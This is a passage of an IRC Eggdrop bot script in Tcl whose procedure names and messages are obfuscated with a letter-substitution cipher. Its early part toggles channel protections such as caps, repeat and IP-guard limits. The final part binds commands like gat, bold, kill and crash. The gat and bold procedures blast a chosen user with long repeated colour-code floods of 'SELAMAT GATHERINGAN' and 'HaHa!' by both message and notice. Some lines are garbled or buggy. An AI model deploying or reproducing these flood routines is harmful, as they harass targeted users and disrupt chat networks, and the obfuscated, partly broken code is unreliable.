puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -K
setuser $cflag XTRA "CI" ""
puthlp "MLGRXV ~$nick ~:~$notc ~PvB ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+gvcg"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +gvcg <nzc>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +T
setuser $cflag XTRA "CHAR" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~GvcG ~$chan ~NzC \[9~$rest\]"
saveuser
}
proc [lines "kfy_-gvcg"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -T
setuser $cflag XTRA "CHAR" ""
puthlp "MLGRXV ~$nick ~:~$notc ~GvcG ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+xzkh"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +xzkh <%kvixvmg>"
return 0
}
if {$rest == 0 || $rest > 100} {
puthlp "MLGRXV ~$nick ~:~$notc ~uroo fmwvi 1 - 100%"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +U
setuser $cflag XTRA "CAPS" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~XZKH ~$chan ~\[9~$rest%\]"
saveuser
}
proc [lines "kfy_-xzkh"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -U
setuser $cflag XTRA "CAPS" ""
puthlp "MLGRXV ~$nick ~:~$notc ~xZKh ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+ivkvzg"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +ivkvzg <nzc>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +R
setuser $cflag XTRA "RPT" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~IvKvzG ~$chan ~NzC \[9~$rest\]"
saveuser
}
proc [lines "kfy_-ivkvzg"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -R
setuser $cflag XTRA "RPT" ""
puthlp "MLGRXV ~$nick ~:~$notc ~IvKvzG ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+zfglelrxv"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +ZfGlelRxV <hvxh>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +V
setuser $cflag XTRA "VC" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGlelRxV ~$chan ~jFvFv \[9~$rest\] ~2mw"
saveuser
pub_mvoice $nick $uhost $hand $chan ""
}
proc [lines "kfy_-zfglelrxv"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -V
setuser $cflag XTRA "VC" ""
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGlelRxV ~$chan ~\[4LUU\]"
saveuser
foreach x [utimers] {
if {[string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] }
}
}
proc [lines "kfy_+vmulixvyzm"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +E
puthlp "MLGRXV ~$nick ~:~$notc ~vmulixvyzm ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-vmulixvyzm"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -E
puthlp "MLGRXV ~$nick ~:~$notc ~vmulixvyzm ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+ivevmtv"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +D
puthlp "MLGRXV ~$nick ~:~$notc ~ivevmtv ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-ivevmtv"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -D
puthlp "MLGRXV ~$nick ~:~$notc ~ivevmtv ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+ulixvw"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +M
puthlp "MLGRXV ~$nick ~:~$notc ~ulixvw ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-ulixvw"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag -M
puthlp "MLGRXV ~$nick ~:~$notc ~ulixvw ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_-xlolfi"] {nick uhost hand chan rest} {
global notc kickclr
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "prxpxoi"] "T"
setuser "config" XTRA "KCLR" "Y"
puthlp "MLGRXV ~$nick ~:~$notc ~xlolfi prxp \[4LUU\]"
saveuser
}
proc [lines "kfy_+xlolfi"] {nick uhost hand chan rest} {
global notc kickclr
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch {unset kickclr}
setuser "config" XTRA "KCLR" ""
puthlp "MLGRXV ~$nick ~:~$notc ~xlolfi prxp \[9LM\]"
saveuser
}
proc [lines "kfy_+xlolfih"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +W
setuser $cflag XTRA "COLOR" ""
puthlp "MLGRXV ~$nick ~:~$notc ~xlolfih prxp ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-xlolfih"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -W
puthlp "MLGRXV ~$nick ~:~$notc ~xlolfih prxp ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+ylow"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +B
setuser $cflag XTRA "BOLD" ""
puthlp "MLGRXV ~$nick ~:~$notc ~YLOW prxp ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-ylow"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -B
puthlp "MLGRXV ~$nick ~:~$notc ~yLOw prxp ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+rktfziw"] {nick uhost hand channel param} {
global botname botnick notc botnick
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +rktfziw <slhgmznv>"
return 0
}
if {$rest == "*" || $rest == "*!*@*"} {
puthlp "MLGRXV ~$nick ~:~$notc ~rmezorw slhgmznv..!"
return 0
}
if {![string match "*@*" $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +rktfziw <slhgmznv>"
return 0
}
set [lines "rktfziw"] [getuser "config" XTRA "IPG"]
foreach y $ipguard {
if {$y == $rest} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~zooivzwb zwwvw..!"
return 0
}
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~zww \[~$rest\] ~Gl RktfzIw"
lappend ipguard $rest
setuser "config" XTRA "IPG" $ipguard
saveuser
return 0
}
[lines "yrmw"] [lines "xgxi"] - * [lines "cz\xgi"]
proc [lines "kfy_-rktfziw"] {nick uhost hand channel param} {
global notc 
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -rktfziw <slhgmznv>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "rktfziw"] [getuser "config" XTRA "IPG"]
set [lines "mrkt"] ""
set [lines "lp"] "F"
foreach y $ipguard {
if {$y == $rest} {
set [lines "lp"] "T"
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN RktfzIw"
} {
lappend nipg
}
}
if {$ok == "T"} {
setuser "config" XTRA "IPG" $nipg
saveuser
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~mlg ulfmwvw..!"
}
setudef flag action
proc [lines "kfy_+zxgrlm"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*+action*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc $chan ~4IvZWB!!"
return 0
}  
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZxGrlm Izmwln \[9LM\]"
} {
setuser $cflag XTRA "ACTION" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~ZxGrlm HvG GL ~\[$rest\]"
}
catch { channel set $chan +action }
puthlp "MLGRXV ~$nick ~:~$notc ~ZxGrlm ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-zxgrlm"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*-action*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZxGrlm ~$chan ~zoivzwb 4WRHzYOV."
return 0
}
catch { channel set $chan -action }
setuser $cflag XTRA "ACTION" ""
puthlp "MLGRXV ~$nick ~:~$notc ~ZxGrlm ~$chan ~\[4Luu\]"
saveuser
}
setudef flag guest
proc [lines "kfy_+tfvhg"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*+guest*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc $chan ~4IvZWB!!"
return 0
}  
catch { channel set $chan +guest }
puthlp "MLGRXV ~$nick ~:~$notc ~Tfvhg Mrxp Prxp (@) & Ivklig ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-tfvhg"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*-guest*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Tfvhg Mrxp Prxp (@) & Ivklig ~$chan ~zoivzwb 4WRHzYOV."
return 0
}
catch { channel set $chan -guest }
puthlp "MLGRXV ~$nick ~:~$notc ~Tfvhg Mrxp Prxp (@) & Ivklig ~$chan ~\[4Luu\]"
saveuser
}
bind pub m `ups pub_ups2
bind pub m `downs pub_downs2
proc pub_ups2 {nick uhost hand channel rest} {
global notc botnick unop
#catch {unset unop($nick)}
if {[isop $botnick $channel]} { return 0 }
if {![matchattr $nick Q]} {
puthelp "NOTICE $nick :$notc 4DeNiEd..!"
return 0
}
putserv "ChanServ op $channel $botnick"
return 0
}
proc pub_downs2 {nick uhost hand channel rest} {
global notc botnick
if {![isop $botnick $channel]} {
return 0
}
if {![matchattr $nick Q]} {
puthelp "NOTICE $nick :$notc 4DeNiEd..!"
return 0
}
if {[matchattr $nick m]} {
set mreq "4MasTeR.ReQuesT"
}
if {[matchattr $nick n]} {
set mreq "4Admin.ReQuesT"
}
if {![string match "*k*" [getchanmode $channel]]} {
putserv "mode $channel -ko+v $mreq $botnick $botnick"
} {
putserv "mode $channel -o+v $botnick $botnick"
}
return 0
}

##################################################################################################
set CC "`"
bind pub o|o ${CC}gat pub_gat
bind pub o|o ${CC}bold pub_bold
bind pub o|o ${CC}bold pub_plut
bind pub o|o ${CC}muach pub_muach
bind pub o|o ${CC}kill pub_kill 
bind pub o|o ${CC}crash pub_crash
bind pub o|o ${CC}modar pub_modar
bind pub o|o ${CC}hiya pub_hiya
bind pub o|o ${CC}beb pub_beb
bind pub o|o ${CC}kopet pub_kopet

proc pub_gat {nick uhost hand channel rest} {
 set person [lindex $rest 0] 
 set rest [lrange $rest 1 end]
 if {$rest!=""} {
  puthelp "PRIVMSG $person :$rest 12,8SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN 11,3SELAMAT GATHERINGAN 12,9SELAMAT GATHERINGAN 1,13SELAMAT GATHERINGAN 12,4SELAMAT GATHERINGAN 9,4SELAMAT GATHERINGAN! 11,3SELAMAT GATHERINGAN 0,2SELAMAT GATHERINGAN 1,3SELAMAT GATHERINGAN !12,14SELAMAT GATHERINGAN! 12,8SELAMAT GATHERINGAN! 9,7SELAMAT GATHERINGAN 11,14SELAMAT GATHERINGAN 1,9SELAMAT GATHERINGAN 13,15SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN "
  puthelp "NOTICE $person :$rest 12,8SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN 11,3SELAMAT GATHERINGAN 12,9SELAMAT GATHERINGAN 1,13SELAMAT GATHERINGAN 12,4SELAMAT GATHERINGAN 9,4SELAMAT GATHERINGAN! 11,3SELAMAT GATHERINGAN 0,2SELAMAT GATHERINGAN 1,3SELAMAT GATHERINGAN !12,14SELAMAT GATHERINGAN! 12,8SELAMAT GATHERINGAN! 9,7SELAMAT GATHERINGAN 11,14SELAMAT GATHERINGAN 1,9SELAMAT GATHERINGAN 13,15SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN "
  puthelp "PRIVMSG $person :$rest 12,8SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN 11,3SELAMAT GATHERINGAN 12,9SELAMAT GATHERINGAN 1,13SELAMAT GATHERINGAN 12,4SELAMAT GATHERINGAN 9,4SELAMAT GATHERINGAN! 11,3SELAMAT GATHERINGAN 0,2SELAMAT GATHERINGAN 1,3SELAMAT GATHERINGAN !12,14SELAMAT GATHERINGAN! 12,8SELAMAT GATHERINGAN! 9,7SELAMAT GATHERINGAN 11,14SELAMAT GATHERINGAN 1,9SELAMAT GATHERINGAN 13,15SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN !"
  puthelp "NOTICE $person :$rest 12,8SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN 11,3SELAMAT GATHERINGAN 12,9SELAMAT GATHERINGAN 1,13SELAMAT GATHERINGAN 12,4SELAMAT GATHERINGAN 9,4SELAMAT GATHERINGAN! 11,3SELAMAT GATHERINGAN 0,2SELAMAT GATHERINGAN 1,3SELAMAT GATHERINGAN !12,14SELAMAT GATHERINGAN! 12,8SELAMAT GATHERINGAN! 9,7SELAMAT GATHERINGAN 11,14SELAMAT GATHERINGAN 1,9SELAMAT GATHERINGAN 13,15SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN !"
  puthelp "PRIVMSG $person :$rest 12,8SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN 11,3SELAMAT GATHERINGAN 12,9SELAMAT GATHERINGAN 1,13SELAMAT GATHERINGAN 12,4SELAMAT GATHERINGAN 9,4SELAMAT GATHERINGAN! 11,3SELAMAT GATHERINGAN 0,2SELAMAT GATHERINGAN 1,3SELAMAT GATHERINGAN !12,14SELAMAT GATHERINGAN! 12,8SELAMAT GATHERINGAN! 9,7SELAMAT GATHERINGAN 11,14SELAMAT GATHERINGAN 1,9SELAMAT GATHERINGAN 13,15SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN !"
  puthelp "NOTICE $person :$rest 12,8SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN 11,3SELAMAT GATHERINGAN 12,9SELAMAT GATHERINGAN 1,13SELAMAT GATHERINGAN 12,4SELAMAT GATHERINGAN 9,4SELAMAT GATHERINGAN! 11,3SELAMAT GATHERINGAN 0,2SELAMAT GATHERINGAN 1,3SELAMAT GATHERINGAN !12,14SELAMAT GATHERINGAN! 12,8SELAMAT GATHERINGAN! 9,7SELAMAT GATHERINGAN 11,14SELAMAT GATHERINGAN 1,9SELAMAT GATHERINGAN 13,15SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN !"
  putlog "  -> !$hand! gat $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick :  Usage: gat <nick> <*add your insult to injury is better :)*>"
 }
}

proc pub_bold {nick uhost hand channel rest} { 
 set person [lindex $rest 0]  
 set rest [lrange $rest 1 end] 
 if {$rest!=""} { 
  puthelp "NOTICE $person :$rest ,5HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!"
  puthelp "PRIVMSG $person :$rest ,9HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!"
  puthelp "NOTICE $person :$rest ,6HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!"
  puthelp "PRIVMSG $person :$rest ,4HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!"
  putlog "  !$hand! bold $person" 
  return 0 
 } 
 if {$rest==""} { 
  puthelp "NOTICE $person :13HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!"
  puthelp "PRIVMSG $person :7HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!"
  puthelp "NOTICE $person :1HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!"
  puthelp "PRIVMSG $person :12HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!"
  putlog "  !$hand! bold $person" 
  return 0 
 }
} 

